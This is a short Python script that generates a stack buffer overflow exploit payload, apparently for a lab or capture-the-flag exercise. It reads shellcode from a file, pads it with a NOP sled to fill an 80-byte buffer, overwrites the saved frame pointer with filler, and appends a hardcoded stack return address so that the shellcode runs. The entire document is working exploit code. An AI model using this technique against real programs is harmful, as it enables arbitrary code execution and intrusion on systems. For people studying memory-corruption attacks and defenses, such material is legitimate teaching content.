shellcode = ''
with open('shellcode.txt','rb') as f:
    shellcode = f.read()
    f.close()

with open('payload3','wb') as f:
    f.write(b'\x90'*8)
    f.write(shellcode)
    f.write(b'\x90'*(80-8-len(shellcode)))
    f.write(b'AAAABBBB')
    f.write(b'\xd8\xdd\xff\xff\xff\x7f') # Shellcode RA stack "0x7f ff ff ff dd d8"
    f.close()

print("Payload created")
